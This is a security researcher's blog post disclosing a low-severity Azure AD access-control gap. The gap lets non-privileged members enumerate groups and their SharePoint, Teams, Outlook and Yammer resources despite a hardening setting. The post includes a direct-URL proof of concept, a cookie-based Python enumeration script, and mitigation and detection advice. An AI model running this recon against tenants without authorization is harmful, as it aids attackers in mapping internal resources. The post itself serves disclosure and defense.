---
layout: post
title: Azure security - Internal recon leveraging lack of access control
date: 2023-02-02 10:00:00
description: A non critical lack of access control in Azure Identity API makes easier SharePoint sites enumeration.
tags: pentest azure
authors:
  - name: Molx32

bibliography: 2023-08-01-Update-management.bib

toc:
  - name: Equations
    # if a section has subsections, you can add them as follows:
    # subsections:
    #   - name: Example Child Subsection 1
    #   - name: Example Child Subsection 2
  - name: Citations
  - name: Footnotes
  - name: Code Blocks
  - name: Layouts
  - name: Other Typography?
---
I recently reported to Microsoft MSRC an issue that is, from my point of view, a low-severity vulnerability that allows 'Members' of Azure AD tenant to enumerate group-related resources, despite hardening Azure AD settings. This could be leveraged by an attacker during internal recon phase.

### Context
#### Azure AD setting
When configuring Azure AD, there are common features and settings that are usually hardened to restrict users permissions. One of these settings is <b>Restrict user ability to access groups features in the Access Panel</b>. This is used to prevent the access to the [Access Panel groups feature](https://account.activedirectory.windowsazure.com/r#/groups), and thus prevent them from enumerating groups, send request to join groups, and access groups-related information. As MSRC answered when I reported the issue : <i>The tenant wide setting, "Restrict user ability to access groups features in the Access Panel" controls users access to the My Groups UI.</i>. This is what we can leverage to improve Azure recon.


#### About groups in Azure AD
But first of all, a small talk about groups in Azure AD. There are multiple, and here are their description (I have shamelessly copied from [MS docs](https://learn.microsoft.com/en-us/microsoft-365/admin/create-groups/compare-groups?view=o365-worldwide)) :
- <b>Security groups</b> - <i>Used for granting access to resources such as SharePoint sites.</i>
- <b>M365 Groups</b> - <i>Used for collaboration between users, both inside and outside your company. They include collaboration services such as SharePoint and Planner.</i>
- <b>Mail-enabled security groups</b> - <i>Used for granting access to resources such as SharePoint, and emailing notifications to those users.</i>
- <b>Shared mailboxes</b> - <i>Used when multiple people need access to the same mailbox, such as a company information or support email address.</i>
- <b>Dynamic distribution groups</b> - <i>Created to expedite the mass sending of email messages and other information within an organization.</i>
- <b>Distribution groups</b> - <i>Used for sending email notifications to a group of people</i>
Note that when a Microsoft 365 Group is created, associated resources usually come with it.

There are multiple common methods to create a group, and depending on how you do, visibility could be set on 'Public' :
- Using the [Azure portal](https://portal.azure.com), you can create both security and M365 groups. Note that using this will cause M365 groups to be private, which is a good thing.
- Using the Azure CLI command <b>az group create</b> only allows you to create private security groups.
- Using the <b>New-MsolGroup</b> only allows you to create private security groups.
- Using <b>New-AzADGroup</b> command allows to create all kinds of groups with the specified visibility for M365 groups

The last common method is using the [M365 Admin portal](https://admin.microsoft.com). As shown on the picture below, the default visibility is Public. The truth is administrator should properly configure this, but they sometimes don't, especially when groups were created a few years ago, when security was not one of the biggest concerns for companies.

<div class="col-sm mt-3 mt-md-0">
  {% include figure.html path="assets/img/MS_vuln_05.png" class="img-fluid rounded z-depth-1" %}
</div>


### Why is it interesting for an attacker?
As shown on the scheme, based on the Azure AD configuration, an attacker could enumerate interesting resources (SharePoint, Yammer, Teams, Outlook group email) and add themselves to public groups without requiring access in order to receive emails sent to the associated email address.
<div class="col-sm mt-3 mt-md-0">
  {% include figure.html path="assets/img/MS_vuln_04.png" class="img-fluid rounded z-depth-1" %}
</div>  


#### Behavior when configured on No (permissive)
When the setting is configured to be permissive, any non-privileged user can access the following data :
- List of groups
- List of resources associated to groups : Outlook, SharePoint, Yammer, Teams
- List of people member of groups

Administrators may want to disable this feature to prevent users seing this data. <u>Note</u> : Guest users can not see this by default.
<div class="col-sm mt-3 mt-md-0">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/O8qMV-Besw8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>


#### Behavior when configured on Yes (restrictive)
When the setting is configured to be restrictive, there is an error page that prevents group and group resource enumeration. The first picture shows Azure AD with the setting set on Yes.
<div class="col-sm mt-3 mt-md-0">
  {% include figure.html path="assets/img/MS_vuln_01.png" class="img-fluid rounded z-depth-1" %}
</div>

This second picture shows the user who can no longer access to the group feature in the Access Panel.
<div class="col-sm mt-3 mt-md-0">
  {% include figure.html path="assets/img/MS_vuln_02.png" class="img-fluid rounded z-depth-1" %}
</div>

***

### The issue
#### POC
To reproduce the issue :
1. As an administrator, set the <b>Restrict user ability to access groups features in the Access Panel</b> setting on <b>Yes</b>
2. Authenticate as a non-privileged user
3. Get a group GUID
4. Access the following URL : 
```
https://account.activedirectory.windowsazure.com/r#/manageMembership?objectType=Group&objectId=<GUID>
```

<div class="col-sm mt-3 mt-md-0">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/NgG_SMecn9k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>


#### Automation
Here is a probably not optimized piece of code that takes a cookie as input, and generates a CSV with all group resources URLs.
{% highlight python %}
import subprocess
import sys
import csv
import requests
import json

# Used to invoke Azure CLI commands
def run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed

# Used to export findings into CSV
def write_header():
    s = 'Id,DisplayName,JoinPolicy,SharePointUrl,TeamsUrl,OutlookUrl,YammerUrl\n'
    with open('results.csv', 'a') as result_file:
        result_file.write(s)
# Used to write line into CSV
def write_line(data):
    json_data = json.loads(data)
    print(json_data)
    s = str(json_data['Id']) + ',' + str(json_data['DisplayName']) + ',' + str(json_data['JoinPolicy']) + ',' + str(json_data['SharePointUrl']) + ',' + str(json_data['TeamsUrl']) + ',' + str(json_data['OutlookUrl']) + ',' + str(json_data['YammerUrl']) + '\n'
    
    with open('results.csv', 'a') as result_file:
        result_file.write(s)

# Used to fecth and parse data
def retrieve_data(cookie, guid):
    url_base = "https://account.activedirectory.windowsazure.com"
    url_path = "/group/DetailsData/"

    # Final values
    url = url_base + url_path + guid
    headers = {
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"Opera";v="93", "Not/A)Brand";v="8", "Chromium";v="107"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-US,en;q=0.9',
        'Connection':'close'
    }

    cookies = {'.AspNet.Cookies': cookie}

    r = requests.get(url, headers=headers, cookies=cookies)
    data = r.content.decode().splitlines()[1]
    return data
    



if __name__ == '__main__':

    # Handle cookie argument.
    # The '.AspNet.Cookies' must not be passed, only the hash value
    cookie = sys.argv[1]
    if not cookie:
        print('Error with provided arguments\nExample: python3 enumerate.py 1EMV2FJC_E_cwrBkZIu_ufEP[...]]7v3Lw')
        sys.exit(1)


    # Shoud be done with az ad group list
    export_groups_cmd = "az login; az ad group list > groups.tmp"

    # CONNECT MSOL
    r = run(cmd=export_groups_cmd)
    if r.returncode != 0:
        print("An error occured: %s", r.stderr)
    else:
        print(export_groups_cmd + " command executed successfully!")

    # Parse JSON
    # Read file
    data = None
    with open("groups.tmp", encoding='utf-16') as data_file:
        write_header()
        groups = json.load(data_file)
        for group in groups:
            data = retrieve_data(cookie, group['id'])
            write_line(data)

    print("*** FILE results.csv CREATED ***")
{% endhighlight %}
See the video to look at how to use it easily. 
<div class="col-sm mt-3 mt-md-0">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/vKPkMWrkkf8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>

***

### Remediate and detect
#### Mitigation
To be clear, there's no reliable mitigation. The only thing I identified is the configuration of the <b>UsersPermissionToReadOtherUsersEnabled</b> feature to <b>false</b>, using the command below. According to Microsoft documentation, this settings <i>“Indicates whether to allow users to view the profile info of other users in their company. This setting is applied company-wide. Set to $False to disable users' ability to use the Azure AD module for Windows PowerShell to access user information for their organization.”</i>.
{% highlight powershell %}
Set-MsolCompanySettings -UsersPermissionToReadOtherUsersEnabled $false
{% endhighlight %}

Also, you may have noticed that non privileged users are allowed to use tools such as Azure CLI. This can't be mitigated for Azure CLI, however you can disable the use of Msol module using this command.
{% highlight powershell %}
Disable-AADIntTenantMsolAccess
{% endhighlight %}

#### Detection
Altough this can't be mitigated, you can still detect it though Azure AD non-interactive signin logs to the <b>Microsoft App Access Panel</b> application. Just send this to Microsoft Sentinel, and create a detection rule to raise an alert when multiple attempts are performed from the same user in a short timeframe.
<div class="col-sm mt-3 mt-md-0">
    {% include figure.html path="assets/img/MS_vuln_06.png" class="img-fluid rounded z-depth-1" %}
</div>
